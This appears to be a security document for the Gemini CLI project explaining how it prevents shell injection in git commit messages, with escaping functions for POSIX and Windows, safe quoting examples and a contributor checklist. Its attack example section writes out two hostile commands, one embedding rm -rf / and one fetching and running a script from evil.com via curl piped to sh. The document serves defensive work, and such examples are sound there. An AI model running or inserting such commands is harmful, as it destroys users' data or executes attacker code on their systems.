# Shell Injection Prevention in Gemini CLI

## Overview

This document describes the security measures implemented in Gemini CLI to prevent shell injection vulnerabilities, particularly in git commit messages and other shell commands.

## The Vulnerability

When constructing shell commands with user-provided input, special characters can be interpreted by the shell, leading to command injection. This is particularly dangerous with:

- **Backticks (`)**: Execute commands and substitute their output
- **Dollar signs ($)**: Variable expansion and command substitution with `$()`
- **Semicolons (;)**: Command chaining
- **Pipes (|)**: Command piping
- **Redirections (>, <)**: File operations

### Example Attack Vector

```bash
# Dangerous - backticks execute embedded commands
git commit -m "Fix `rm -rf /` issue"  # Would execute rm command!

# Dangerous - command substitution
git commit -m "Update $(curl evil.com/script.sh | sh)"
```

## The Solution

### 1. Cross-Platform Shell Escape Utility

We've implemented a robust shell escaping utility in `packages/core/src/utils/shellEscape.ts` that automatically detects the operating system and applies appropriate escaping:

#### POSIX Systems (Linux/macOS)
```typescript
function escapeShellArgPosix(str: string): string {
  // Empty strings become ''
  if (str === '') return "''";
  
  // Check for special characters
  const needsEscaping = /[^A-Za-z0-9_\-.\/]/.test(str);
  
  if (!needsEscaping) return str;
  
  // Use single quotes to prevent ALL expansions
  // Escape single quotes by ending quote, adding \', and starting new quote
  return "'" + str.replace(/'/g, "'\\''") + "'";
}
```

#### Windows Systems (cmd.exe)
```typescript
function escapeShellArgWindows(str: string): string {
  // Empty strings become ""
  if (str === '') return '""';
  
  // Check for special characters
  const needsEscaping = /[^A-Za-z0-9_\-.]/.test(str);
  
  if (!needsEscaping) return str;
  
  let escaped = str;
  // Escape cmd.exe metacharacters with ^
  escaped = escaped.replace(/([&|<>^])/g, '^$1');
  // Double up quotes
  escaped = escaped.replace(/"/g, '""');
  // Double percent signs
  escaped = escaped.replace(/%/g, '%%');
  
  return '"' + escaped + '"';
}
```

### 2. AI Prompt Instructions

The AI model is instructed to:
- Always use single quotes for shell arguments containing special characters
- Properly escape single quotes within messages
- Never use double quotes for user-provided content (as they allow some expansions)

### 3. Safe Usage Examples

```bash
# Safe - single quotes prevent all expansions
git commit -m 'Fix `ComponentName` rendering issue'

# Safe - properly escaped single quote
git commit -m 'Fix Mary'\''s code'

# Safe - complex message with multiple special characters
git commit -m 'Update code for `$USER` @ $(date)'
```

## Implementation Details

### Why Single Quotes?

Single quotes in bash/sh provide the strongest protection:
- **Double quotes** (`"`) still allow: `$`, `` ` ``, `\`, `!` expansions
- **Single quotes** (`'`) prevent ALL expansions except for the single quote itself
- **Escaping single quotes**: Use `'\''` pattern (end quote, escaped quote, start quote)

### Testing

Comprehensive test cases cover:
- Command substitution attempts (backticks and `$()`)
- Variable expansion attempts
- Special characters and operators
- Unicode and international characters
- Edge cases (empty strings, only special characters)

## Best Practices for Contributors

When adding new shell command features:

1. **Always escape user input**: Use `escapeShellArg()` for any user-provided content
2. **Prefer structured APIs**: When possible, use Node.js APIs instead of shell commands
3. **Validate input**: Check for malicious patterns before processing
4. **Test thoroughly**: Add test cases for security scenarios
5. **Document security considerations**: Note any security implications in code comments

## Verification

To verify the fix works correctly:

```bash
# Test with the escaping utility
npm test packages/core/src/utils/shellEscape.test.ts

# The AI should now properly escape:
# Input: "Fix `bug` in code"
# Output: git commit -m 'Fix `bug` in code'
```

## Security Audit Checklist

- [x] All user input is escaped before shell execution
- [x] Single quotes used for maximum protection
- [x] Comprehensive test coverage for edge cases
- [x] AI model instructed on proper escaping
- [x] Documentation provided for future contributors
- [x] No use of `eval` or similar dangerous constructs

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Bash Manual - Quoting](https://www.gnu.org/software/bash/manual/html_node/Quoting.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---

*Last updated: December 2024*
*Security contact: security@gemini-cli.dev*